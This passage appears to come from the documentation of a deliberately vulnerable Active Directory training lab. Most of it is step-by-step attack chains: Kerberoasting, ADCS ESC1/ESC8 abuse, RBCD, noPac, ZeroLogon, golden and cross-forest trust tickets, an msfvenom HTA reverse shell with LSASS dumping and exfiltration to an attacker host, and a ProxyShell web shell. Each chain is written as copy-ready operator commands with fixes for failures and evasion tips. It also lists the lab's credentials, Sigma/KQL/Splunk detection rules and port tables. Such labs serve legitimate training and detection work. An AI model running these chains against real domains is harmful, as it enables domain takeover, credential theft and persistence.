                     -request -outputfile spns.kr
hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt -r \
        /usr/share/hashcat/rules/best64.rule --force
```

**Common failures**:
- `KDC_ERR_S_PRINCIPAL_UNKNOWN` — SPN doesn't exist; check with `setspn -L svc_web`
- Empty result — no SPNs in the domain; DVAD ships at least 8
- Hashcat says cracked but TGS reuses RC4 → ensure `-m 13100` not `-m 19700`

**Opsec**: Visible as 4769 events with `etype 0x17`. DVAD's audit policy is off; in a real env, throttle to 1 SPN/min.

**Validation**:

```bash
nxc smb 10.10.0.0/24 -u svc_web -p 'Summer2023!' --shares
# expect: PWN3D! on file01 + sql01
```

**Follow-on patterns**: B (ESC1 with svc_web), D (RBCD with svc_web), J (LSASS dump on file01 if local admin).

### Pattern B — ADCS ESC1 deep-dive

**Theory**: Cert template with `ENROLLEE_SUPPLIES_SUBJECT=true` + Client Authentication EKU + Domain Users enroll → any user requests a cert *as* any other user.

**Pre-condition**: ESC1 template exists (DVAD: `ESC1Template`).
**Time to DA**: 30 s.

**Operator one-liner**:

```bash
certipy req  -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
             -ca CORP-CA -template ESC1Template -upn Administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

**Common failures**:
- `Could not request certificate` → CA not online; check `Get-Service certsvc` on ca01
- `certipy auth` returns no NT hash → PKINIT works but UnPAC fails; pass `-no-hash` to just get TGT, then `impacket-secretsdump -k -no-pass`

**Opsec**: 4886/4887 on CA. Subject Alternative Name set to "Administrator" is the smoking gun.

**Validation**:

```bash
impacket-secretsdump -hashes :<NT> -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
```

### Pattern C — Coerce + Relay → ESC8 deep-dive

**Theory**: Coerce a DC$ to authenticate to attacker via MS-EFSR/MS-RPRN/MS-DFSNM. Relay that NTLM auth to ADCS web-enrol which has no EPA (Extended Protection for Authentication). DC$ gets a DC certificate. UnPAC for krbtgt-equivalent.

**Pre-condition**: ADCS web enrol up (port 80 on ca01), EFSR pipe accessible.
**Time to DA**: 60 s.

**Operator session**:

```bash
# Terminal 1
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support
# Terminal 2
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
# ntlmrelayx prints: [*] B64 certificate: <base64>
echo '<b64>' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10 -username 'dc01$' -domain corp.local
# returns NT hash for dc01$
impacket-secretsdump -hashes :<NT_DC01> -just-dc corp.local/dc01\$@dc01.corp.local
```

**Common failures**:
- `PetitPotam` returns `STATUS_PIPE_DISCONNECTED` → patch level too high; try `dfscoerce.py` or `printerbug.py`
- ntlmrelayx says `Connection refused` → ADCS web role not installed; `Add-WindowsFeature ADCS-Web-Enrollment`
- Cert returned but UnPAC fails → `dc01$` not allowed PKINIT; use the cert with `certipy req -on-behalf-of` instead

**Opsec**: Loud (auth flood, cert issuance event). DVAD ships with audit off; in real env, audit Cert issuance.

### Pattern D — RBCD deep-dive

**Theory**: AD computer objects have `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write this attribute on `target$`, you can S4U2Self → S4U2Proxy as any user including DA to any SPN of `target$`.

**Pre-condition**: GenericWrite/GenericAll/WriteProperty on target computer object. DVAD pre-stages this on `ws01$` for `alice`.
**Time to DA**: 90 s.

**Operator session**:

```bash
# 1. Create a controllable machine account (MAQ=10)
impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
# 2. Write RBCD on the target
impacket-rbcd corp.local/alice:'DVADlab2024!' -delegate-from 'evil$' \
              -delegate-to 'ws01$' -action write -dc-ip 10.10.0.10
# 3. Verify
impacket-rbcd corp.local/alice:'DVADlab2024!' -delegate-to 'ws01$' -action read -dc-ip 10.10.0.10
# 4. S4U2Self + S4U2Proxy as Administrator
impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
               corp.local/evil\$:'EvilPass1!' -dc-ip 10.10.0.10
export KRB5CCNAME=Administrator@cifs_ws01.corp.local@CORP.LOCAL.ccache
# 5. Use it
impacket-psexec -k -no-pass ws01.corp.local
```

**Common failures**:
- `KDC_ERR_BADOPTION` on S4U2Proxy → TGT not forwardable; add `-force-forwardable`
- `KDC_ERR_S_PRINCIPAL_UNKNOWN` on S4U2Self → wrong SPN format; `cifs/<fqdn>` (lowercase, no port)
- `addcomputer` returns `STATUS_DS_QUOTA_REACHED` → MAQ exhausted; DVAD ships MAQ=10 per user but if reused, switch users

**Opsec**: 5136 on the DC (LDAP modify). Modern EDRs alert on `msDS-AllowedToActOnBehalfOfOtherIdentity` change.

### Pattern E — noPac deep-dive

**Theory**: CVE-2021-42278 (sAMAccountName spoofing) + CVE-2021-42287 (KDC bug). Rename a machine account to a DC name, request a TGT, then revert the name. KDC issues a TGS for `cifs/dc01` with PAC saying you're DA.

**Pre-condition**: MachineAccountQuota>0, no patch installed (DVAD ships unpatched on purpose).
**Time to DA**: 30 s with the all-in-one script.

```bash
impacket-noPac.py corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
                  -dc-host dc01.corp.local -shell --impersonate Administrator
```

**Manual variant** (when the script fails):

```bash
# Step-by-step in §10.5
```

**Common failures**:
- Script complains `Could not rename machine` → MAQ exhausted; use a different user
- `KDC_ERR_TGT_REVOKED` → KB5008380 installed; lab will refuse if you ever ran Windows Update (DVAD doesn't)

### Pattern F — ZeroLogon deep-dive

**Theory**: CVE-2020-1472. MS-NRPC ComputeNetlogonCredential uses AES-CFB8 with an IV of zeros. Pass 16 zero bytes as auth → 1/256 chance per attempt of success. After ~256 tries, DC accepts and lets you set the machine account password to anything (including empty).

**WARNING**: This breaks the secure channel. You MUST restore the original DC$ password or the entire domain dies.

```bash
python3 zerologon_tester.py DC01 10.10.0.10
# returns: "Success!" → vulnerable
python3 set_empty_pw.py DC01 10.10.0.10
# DC$ password is now empty
impacket-secretsdump -no-pass -just-dc corp.local/dc01\$@10.10.0.10
# Grab krbtgt and the ORIGINAL DC$ hash from the dump
python3 reinstall_original_pw.py DC01 10.10.0.10 <hex_pw>
# Verify
nltest /sc_query:corp.local
```

**If you forget to restore**: Reboot the DC, then run `netdom resetpwd /server:dc01 /userd:Administrator /passwordd:DVADlab2024!` from another DC. In DVAD with a single DC, redeploy.

### Pattern G — ExtraSID child → parent

**Theory**: A child domain shares the Kerberos namespace with its parent via transitive trust. The PAC carries `ExtraSIDs`; if the child DC krbtgt is compromised, you forge a ticket with `ExtraSID = <PARENT_SID>-519` (Enterprise Admins) and the parent KDC accepts it.

```bash
# 1. DA on eu.corp.local
impacket-secretsdump -just-dc-user krbtgt eu.corp.local/Administrator@10.10.0.11
# 2. Look up SIDs
impacket-lookupsid eu.corp.local/Administrator@10.10.0.11 | grep -i domain
impacket-lookupsid corp.local/Administrator@10.10.0.10 | grep -i domain
# 3. Forge with extra SID
impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.corp.local \
                  -extra-sid <CORP_SID>-519 Administrator
# 4. Use
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
```

### Pattern H — Golden Ticket

**Theory**: krbtgt is the account that signs all TGTs. With its NT/AES key, you forge a TGT with arbitrary PAC contents.

```bash
# krbtgt is fixed at KrbtgtDVAD2024! in DVAD — NT hash is deterministic
python3 -c "import hashlib; print(hashlib.new('md4', 'KrbtgtDVAD2024!'.encode('utf-16-le')).hexdigest())"
# OR pull live:
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10

# Forge
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache

# Use
impacket-psexec -k -no-pass dc01.corp.local
```

**Lifetime**: Default 10 years. Real Golden Tickets are ~10h to blend in.
**Detection**: 4769 with PAC anomalies; impacket sets group IDs to 512,513,518,519 by default — defenders alert when a "normal user" has these.

### Pattern I — Cross-forest trust ticket (corp → finance)

```bash
# Trust account hash
impacket-secretsdump -just-dc-user 'finance.local$' corp.local/Administrator@10.10.0.10
# Forge inter-realm referral
impacket-ticketer -nthash <trust_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <FIN_SID>-519 -spn 'krbtgt/finance.local' Administrator
export KRB5CCNAME=Administrator.ccache
# Request a service ticket to finance
impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator \
               corp.local/Administrator
# Use the resulting cross-forest TGS
impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
```

### Pattern J — Phishing → ws01 → LSASS → pivot

```bash
# Build phishing payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f hta-psh -o stage1.hta
python3 -m http.server 8080
# Coerce alice to open it (out of scope of the lab; simulate by running it on ws01 manually)
# Once shell lands on ws01 as alice:
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\l.dmp full
# Exfil
smbclient //10.10.0.1/share -U alice%DVADlab2024! -c 'put C:\Users\Public\l.dmp l.dmp'
# Parse offline
pypykatz lsa minidump l.dmp
# Use harvested creds
nxc smb 10.10.0.0/24 -u svc_admin -H <NTLM>
```

### Pattern K — mitm6 + RBCD

```bash
# Two terminals
# T1: mitm6 + relay
sudo mitm6 -d corp.local -i <iface> &
sudo impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local --delegate-access --no-smb-server
# T2: trigger a victim to authenticate (browse a webpage, type a UNC, anything that does WPAD)
# After ntlmrelayx prints "Delegation rights modified successfully":
impacket-getST -spn cifs/<victim>.corp.local -impersonate Administrator \
               corp.local/<rbcd_machine>\$:'<pw>' -dc-ip 10.10.0.10
KRB5CCNAME=Administrator@cifs_<victim>.corp.local@CORP.LOCAL.ccache impacket-psexec -k -no-pass <victim>.corp.local
```

### Pattern L — ProxyShell (operator-extended)

```bash
# Requires an Exchange VM; not shipped by default
python3 ProxyShell.py -t https://exchange.corp.local -e Administrator@corp.local
curl 'https://exchange.corp.local/aspnet_client/shell.aspx?cmd=whoami'
```

### Pattern M — SCCM PXE NAA

```bash
python3 PXEThief.py -d corp.local --target ws-pxe.corp.local --interface <iface>
python3 pxe_thief_decrypt.py policy.xml
# Resulting NAA cred has rights on every member
nxc smb 10.10.0.0/24 -u <NAA> -p '<pw>'
```

### Pattern N — USB / library-ms drop

```bash
# Build the .library-ms (see §13 IA-019 for full content)
zip 'Q3.zip' 'Q3.library-ms'
sudo responder -I <iface> -wv
# When victim previews the file:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Pattern P — ExtraSID corp → eu (reverse of G)

```bash
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
impacket-ticketer -nthash <corp_krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <EU_SID>-512 -spn 'krbtgt/eu.corp.local' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.eu.corp.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc eu.corp.local/Administrator@dc01.eu.corp.local
```

### Pattern Q — Trust key forge → finance

(Same as Pattern I but explicit about the external trust direction.)

### Pattern R — Tree-root trust → root.corp

```bash
impacket-secretsdump -just-dc-user 'ROOT$' corp.local/Administrator@10.10.0.10
impacket-ticketer -nthash <ROOT_trust_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <ROOT_SID>-519 -spn 'krbtgt/root.corp' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.root.corp -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc root.corp/Administrator@dc01.root.corp
```

### Pattern S — Foreign Security Principal hijack

```bash
# Enumerate FSPs in the foreign forest
nxc ldap 10.20.0.10 -u svc_x -p '<pw>' --query '(objectClass=foreignSecurityPrincipal)' 'cn'
# Identify a member of a sensitive group with an FSP from corp.local
# In BloodHound: "Cross-Forest" query
# Add yourself to the matching corp.local group → inherit the foreign privilege
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --add-computer 'evil$' --groups 'CrossForestGroup'
# Re-auth as alice and access the foreign resource
impacket-psexec finance.local/alice:'DVADlab2024!'@10.20.0.10
```

### Pattern T — Cross-forest Kerberoast

```bash
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
export KRB5CCNAME=alice.ccache
impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
                     -request corp.local/alice -outputfile xforest.kr
hashcat -m 13100 xforest.kr /usr/share/wordlists/rockyou.txt
```

### Pattern U — Cross-forest ADCS enrollment

```bash
certipy find -u svc_x@finance.local -p '<pw>' -dc-ip 10.20.0.10 \
             -target ca01.corp.local -stdout -vulnerable
certipy req  -u svc_x@finance.local -p '<pw>' -target ca01.corp.local \
             -ca CORP-CA -template ESC1Template -upn Administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### Pattern V — SID History bypass

```powershell
# From DA@corp.local on a Windows host:
mimikatz # privilege::debug
mimikatz # sid::add /sid:S-1-5-21-FINANCE-519 /sam:alice
# Now alice's PAC carries Enterprise Admins of finance.local
```

```bash
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
impacket-secretsdump -k -no-pass -just-dc finance.local/alice@dc01.finance.local
```

### Pattern W — Cross-forest unconstrained delegation

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
# DVAD: svc_legacy has unconstrained delegation; file01 hosts it
# Coerce dc01.finance.local to authenticate to file01
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local file01.corp.local 10.20.0.10
# On file01, dump LSASS — TGT of finance DC$ is now in there
psexec to file01 as DA, then:
mimikatz # sekurlsa::tickets /export
# Pull dc01-finance.kirbi → use it
impacket-secretsdump -k -no-pass -just-dc finance.local/dc01\$@dc01.finance.local
```

### Pattern X — noPac across trust

```bash
impacket-noPac.py finance.local/svc_x:'<pw>' -dc-ip 10.20.0.10 \
                  -dc-host dc01.finance.local -shell --impersonate Administrator
```

(Works because trust accounts ship vulnerable in DVAD.)

### Pattern Y — Cross-forest ESC11

```bash
# Coerce finance DC$ → relay to corp CA via ICPR
impacket-PetitPotam -u svc_x -p '<pw>' -d finance.local 10.10.0.1 10.20.0.10
sudo impacket-ntlmrelayx -t 'rpc://ca01.corp.local' -rpc-mode ICPR \
                         -icpr-ca-name 'CORP-CA' -template 'Machine' -smb2support
# Result: finance DC$ cert from corp CA → cross-forest PKINIT
```

### Pattern Z — Diamond + Sapphire forest persistence

```powershell
# Diamond — modify existing TGT in-place (less detectable)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 `
                   /groups:512,519 /krbkey:<krbtgt_aes256> /ptt

# Sapphire — forge with live PAC from S4U2Self
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /id:500 `
                  /domain:corp.local /sid:<CORP_SID> /sapphire /ptt
```

---

## Appendix Q — Flag manifest reference

The flag_factory drops 382 `.txt` files across the 8 VMs. Each flag has:
- An ID (e.g. `FLAG-IA-001-InitialAccess.txt`)
- A category (`InitialAccess`, `Enumeration`, `Recon`, `Credential`, `Lateral`, `PrivilegeEsc`, `Persistence`, `DomainForest`)
- A host (where the file lives)
- An ACL tier:
  - `everyone` — readable by anonymous/null session
  - `domain_users` — any authenticated AD user
  - `admins` — Administrators of the local host
  - `system_only` — SYSTEM-level only

### Flag count by category

```text
Enumeration       80
Credential        65
PrivilegeEsc      60
InitialAccess     50
DomainForest      40
Persistence       37
Lateral           35
Recon             15
                ----
TOTAL            382
```

### Flag count by host

```text
dc01.corp.local           ~110   (most flags — DC is the center of every chain)
dc01.eu.corp.local         ~45
ca01.corp.local            ~40
file01.corp.local          ~55
sql01.corp.local           ~35
ws01.corp.local            ~50
dc01.finance.local         ~25
dc01.root.corp             ~22
```

(Exact counts in `ansible/roles/flag_factory/vars/main.yml`.)

### Verifying flag drops post-deploy

```bash
# Count flags per host
for h in dc01.corp.local ws01.corp.local file01.corp.local sql01.corp.local; do
  echo -n "$h: "
  nxc smb $h -u Administrator -p 'DVADlab2024!' -x 'cmd /c dir C:\Flags\ /B | find /c ".txt"'
done
```

### Reading flags as anonymous (everyone-tier)

```bash
smbclient //10.10.0.10/C\$ -N -c 'cd Flags; ls FLAG-IA-001*'
# (Will fail — C$ requires admin. Everyone-tier flags are exposed via the lab's IPC$ or anonymous-readable shares as defined in flag_factory.)

# Actual everyone-tier exposure (e.g. file01 Public$ share):
smbclient //10.10.0.13/Public -N -c 'recurse on; mget FLAG-IA-* *'
```

### Reading admin-tier flags (after Pattern A-N)

```bash
impacket-psexec -k -no-pass dc01.corp.local
# in shell:
type C:\Flags\FLAG-DF-001*.txt
```

### Reading system-tier flags

```bash
# After Golden Ticket (SYSTEM via psexec):
type C:\Flags\system_only\*.txt
```

---

## Appendix R — Glossary of DVAD-specific terms

**`DVAD_HOME`** — environment variable set by `deploy.sh`, points to the repo root. Used by `qemu/vm-create.sh` to locate `media/`, `autounattend/`, `vms/`.

**`dvad-ctf` bridge** — Linux bridge for `corp.local + eu.corp.local`. 10.10.0.0/21.

**`dvad-finance` bridge** — Linux bridge for `finance.local`. 10.20.0.0/24.

**`dvad-root` bridge** — Linux bridge for `root.corp`. 10.30.0.0/24.

**`/tmp/dvad-dnsmasq/`** — Per-project dnsmasq instance. Owns lease file + log. Static leases by MAC.

**`flag_factory`** — Ansible role at `ansible/roles/flag_factory/`. Reads `vars/main.yml` (382 entries) and drops `.txt` files on the matching host.

**`PLAN.md`** — Authoritative spec for every flag/attack ID. The lab promises every ID listed there.

**`autounattend.xml`** — Per-VM unattended install file generated by `qemu/vm-create.sh`. Specifies edition, language, partition layout, locale, admin password.

**`post-install.ps1`** — Per-VM first-boot script. Disables Defender, opens firewall, enables WinRM, drops `vms/<name>.installed` marker (consumed by `scripts/wait-vms.sh`).

**`vms/<name>.installed`** — Marker file. Present = VM finished post-install and is ready for Ansible. Absent = VM still in install or has been wiped.

**`site.yml`** — Master Ansible playbook. 14 phases (see Appendix G.1).

**`adcs_vulns`** — Ansible role at `ansible/roles/adcs_vulns/`. Publishes the ESC1..ESC16 templates.

**`windows_base`** — Ansible role for the "post-install hardening reverse" — disables Defender, opens firewall, enables network discovery, disables UAC remote restriction.

**`vuln_setup`** — Cross-cutting role for misconfig injection (weak passwords, SPN registration, ACL backdoors).

**Lab password (everywhere)** — `DVADlab2024!`. Public.

**`KrbtgtDVAD2024!`** — Public krbtgt password used by every domain. Allows deterministic Golden Ticket construction without prior DCSync (NT hash is `md4(utf16le("KrbtgtDVAD2024!"))`).

**`TrustKey2024!`** — Public trust key for every external/forest trust.

**`SqlServer2025!`** — `sa` password on sql01.

**`MachineAccountQuota=10`** — Per-user limit on machine account creation. DVAD ships the default, which is the precondition for Patterns D and E.

---

## Appendix S — Detection rule catalog (Sigma / KQL / Splunk)

If you re-enable Sysmon + Windows audit policy on DVAD to test detections, the following rules match the patterns the lab exercises.

### S.1 Kerberoasting

**Sigma**:
```yaml
title: Kerberoasting via Service Ticket Request
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
    TicketOptions: '0x40810000'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
level: high
```

**KQL** (Microsoft Sentinel):
```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| summarize count() by Account, ServiceName, bin(TimeGenerated, 1h)
| where count_ > 5
```

**Splunk**:
```spl
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17
| search NOT Service_Name="*$"
| stats count by Account_Name, Service_Name
| where count > 5
```

### S.2 AS-REP Roasting

**Sigma**:
```yaml
title: AS-REP Roasting
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
    TicketEncryptionType: '0x17'
  condition: selection
level: high
```

### S.3 DCSync

**Sigma**:
```yaml
title: DCSync from non-DC Account
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter:
    SubjectUserName|endswith: '$'
  condition: selection and not filter
level: critical
```

### S.4 Golden Ticket usage

**Sigma**:
```yaml
title: Golden Ticket - Anomalous Lifetime
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
  filter_ticket_lifetime:
    TicketLifetime: '>=10h'
  condition: selection and filter_ticket_lifetime
level: high
```

### S.5 PetitPotam

**Sigma**:
```yaml
title: PetitPotam via EFSRPC named pipe
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    RelativeTargetName|endswith:
      - 'efsrpc'
      - 'lsarpc'
  condition: selection
level: high
```

### S.6 NTLM Relay

**Sigma**:
```yaml
title: NTLM Relay - Cross-host Logon
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
  filter:
    IpAddress: '-'
  condition: selection and not filter
level: medium
```

### S.7 Shadow Credentials

**Sigma**:
```yaml
title: msDS-KeyCredentialLink Modified
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
  condition: selection
level: high
```

### S.8 RBCD Write

**Sigma**:
```yaml
title: RBCD Write
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
  condition: selection
level: critical
```

### S.9 noPac

**Sigma**:
```yaml
title: Machine Account Renamed to DC Name
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4742
    SamAccountName|endswith: '$'
  filter:
    SubjectUserName: '*$'
  condition: selection and not filter
level: critical
```

### S.10 ZeroLogon

**Sigma**:
```yaml
title: ZeroLogon - Netlogon Authenticator Zero
logsource:
  product: windows
  service: system
detection:
  selection:
    Provider: 'Netlogon'
    EventID:
      - 5805
      - 5723
  condition: selection
level: critical
```

### S.11 LSASS Memory Access

**Sigma**:
```yaml
title: LSASS Access via comsvcs.dll
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains|all:
      - 'comsvcs.dll'
      - 'MiniDump'
  condition: selection
level: critical
```

### S.12 ADCS ESC1 — Suspicious SAN

**Sigma**:
```yaml
title: ADCS Certificate Issued with Anomalous SAN
logsource:
  product: windows
  service: ca-auditing
detection:
  selection:
    EventID: 4886
    AttributeSANUPN|contains:
      - 'Administrator'
      - 'krbtgt'
  filter:
    SubjectName: 'Administrator'
  condition: selection and not filter
level: critical
```

### S.13 ADCS ESC8 — NTLM Web Enrollment from non-DC

**Sigma**:
```yaml
title: NTLM Authentication to ADCS Web Enrollment
logsource:
  product: windows
  service: iis
detection:
  selection:
    URI|startswith:
      - '/certsrv/'
      - '/certfnsh.asp'
    AuthenticationType: 'NTLM'
  condition: selection
level: medium
```

### S.14 mitm6

**Sigma**:
```yaml
title: Suspicious IPv6 DHCP Server Activity
logsource:
  product: windows
  service: dhcp
detection:
  selection:
    EventID: 50027
  condition: selection
level: medium
```

### S.15 Skeleton Key

**Sigma**:
```yaml
title: LSASS Patch (Skeleton Key)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4673
    PrivilegeList|contains: 'SeDebugPrivilege'
    ProcessName|endswith: 'lsass.exe'
  condition: selection
level: critical
```

### S.16 DCShadow

**Sigma**:
```yaml
title: DCShadow - Replication from Non-DC
logsource:
  product: windows
  service: directory-service
detection:
  selection:
    EventID:
      - 4928   # AD replication source object created
      - 4929   # AD replication source object removed
  filter:
    UserSID|startswith: 'S-1-5-19'   # local SYSTEM
  condition: selection and not filter
level: critical
```

---

## Appendix T — Per-host port and service reference

Comprehensive view of every listening port across the 8 VMs.

### T.1 dc01.corp.local (10.10.0.10)

| Port | Proto | Service | Note |
|---|---|---|---|
| 53 | tcp/udp | DNS | AXFR open (IA-003) |
| 88 | tcp | Kerberos | KDC |
| 135 | tcp | RPC EPM | Endpoint mapper |
| 139 | tcp | NetBIOS-SSN | Legacy SMB |
| 389 | tcp/udp | LDAP | No signing required |
| 445 | tcp | SMB2/3 | No signing required |
| 464 | tcp/udp | kpasswd | Password change |
| 593 | tcp | HTTP-RPC EPMap | Used by ESC8 chain (rarely) |
| 636 | tcp | LDAPS | No channel binding |
| 3268 | tcp | LDAP GC | Global catalog |
| 3269 | tcp | LDAPS GC | Global catalog over TLS |
| 5985 | tcp | WinRM HTTP | Plaintext WinRM |
| 5986 | tcp | WinRM HTTPS | Self-signed |
| 9389 | tcp | AD Web Services | PowerShell AD module |
| 49152-65535 | tcp | RPC dynamic | DCSync, samr, lsarpc |

### T.2 dc01.eu.corp.local (10.10.0.11)

Same surface as dc01.corp.local. AXFR for `eu.corp.local`.

### T.3 ca01.corp.local (10.10.0.12)

| Port | Proto | Service | Note |
|---|---|---|---|
| 80 | tcp | IIS HTTP | `/certsrv/` web enrol (ESC8) |
| 135 | tcp | RPC EPM | ICertPassage (ESC11) |
| 443 | tcp | IIS HTTPS | Self-signed |
| 445 | tcp | SMB2/3 | — |
| 593 | tcp | HTTP-RPC EPMap | — |
| 5985 | tcp | WinRM | — |
| 5986 | tcp | WinRM HTTPS | — |
| 47001 | tcp | WSMAN | WS-Management |
| 49152-65535 | tcp | RPC dynamic | ICPR |

### T.4 file01.corp.local (10.10.0.13)

| Port | Proto | Service | Note |
|---|---|---|---|
| 21 | tcp | FTP | Anonymous (IA-008) |
| 22 | tcp | OpenSSH | Password auth (IA-032) |
| 23 | tcp | Telnet | IA-033 |
| 80 | tcp | IIS HTTP | Default site |
| 111 | tcp/udp | rpcbind | NFS portmapper |
| 135 | tcp | RPC EPM | — |
| 139 | tcp | NetBIOS-SSN | SMB1 |
| 445 | tcp | SMB1/2/3 | SMB1 enabled (IA-015) |
| 2049 | tcp/udp | NFS | Anonymous (IA-009) |
| 5985 | tcp | WinRM | — |
| 5986 | tcp | WinRM HTTPS | — |
| 49152-65535 | tcp | RPC dynamic | — |

### T.5 sql01.corp.local (10.10.0.14)

| Port | Proto | Service | Note |
|---|---|---|---|
| 135 | tcp | RPC EPM | — |
| 139 | tcp | NetBIOS-SSN | — |
| 445 | tcp | SMB2/3 | — |
| 1433 | tcp | MSSQL TDS | sa : SqlServer2025! (IA-011) |
| 1434 | udp | SQL Browser | Instance discovery |
| 5985 | tcp | WinRM | — |
| 5986 | tcp | WinRM HTTPS | — |

### T.6 ws01.corp.local (10.10.0.100)

| Port | Proto | Service | Note |
|---|---|---|---|
| 135 | tcp | RPC EPM | — |
| 139 | tcp | NetBIOS-SSN | — |
| 445 | tcp | SMB2/3 | — |
| 3389 | tcp | RDP | NLA OFF (IA-018) |
| 5985 | tcp | WinRM | — |
| 5986 | tcp | WinRM HTTPS | — |
| 49152-65535 | tcp | RPC dynamic | — |

### T.7 dc01.finance.local (10.20.0.10)

Same surface as dc01.corp.local, in finance.local realm. Trust to corp.local (SID filtering OFF).

### T.8 dc01.root.corp (10.30.0.10)

Same surface as dc01.corp.local, in root.corp realm. Tree-root trust to corp.local (SID filtering OFF).

---

## Appendix U — Lab operation matrix

This matrix is "for every attack ID, what's the minimum precondition and what's the expected post-condition?". Use it to plan a learning path.

### U.1 IA matrix

| ID | Pre | Post |
|---|---|---|
| IA-001 | network reach to dc01 | users.txt, share list |
| IA-002 | network reach + LDAP/389 | LDAP rootDSE, users, groups |
| IA-003 | network reach + DNS/53 | full DNS zone (AXFR) |
| IA-004 | network reach + Kerberos/88 + usernames | valid usernames separated |
| IA-005 | usernames + Kerberos/88 + ≥1 user with `DoNotRequirePreAuth` | AS-REP hash → crackable |
| IA-006 | usernames | ≥1 valid cred (DVAD default works) |
| IA-007 | network + SMB/445 + file01 reachable | anonymous share read |
| IA-008 | network + FTP/21 | anonymous file listing |
| IA-009 | network + NFS/2049 | mountable export |
| IA-010 | network + SNMP/161 | enumerable MIB |
| IA-011 | network + MSSQL/1433 | RCE via xp_cmdshell |
| IA-012 | network + WinRM/5985 + cred | interactive shell |
| IA-013 | low-priv cred + reach to DC + reach to CA | dc01$ cert |
| IA-014 | low-priv cred + reach to DC | NTLM hash auth coerced |
| IA-015 | network + SMB1/445 on file01 | RCE via psexec |
| IA-016 | network reach to DC | NETLOGON channel reset (DC dump) |
| IA-017 | cred + reach to DC | DC auth coerced |
| IA-018 | RDP/3389 + cred | interactive desktop |
| IA-019 | victim previews .library-ms | NTLM hash leaked |
| IA-020 | victim opens HTA | remote shell |
| IA-021 | victim opens LNK | NTLM hash leaked |
| IA-022 | IPv6 LAN | NTLM relay primitive |
| IA-023 | UDP/137 + UDP/5355 | NTLM hash captured |
| IA-024 | IPv6 LAN | DNS hijack |
| IA-025 | network + IIS/80 | file upload + execute |
| IA-026..IA-028 | operator-extended (Tomcat/Jenkins/Confluence) | RCE |
| IA-029 | SCCM PXE up | NAA cred |
| IA-030 | physical access | autorun execution |
| IA-031 | (cloud only) | metadata creds |
| IA-032 | SSH/22 + cred | shell on file01 |
| IA-033 | Telnet/23 | shell on file01 |
| IA-034..IA-050 | ENUM-surface entries | various footholds |

### U.2 ENUM matrix (top 10)

| ID | Pre | Post |
|---|---|---|
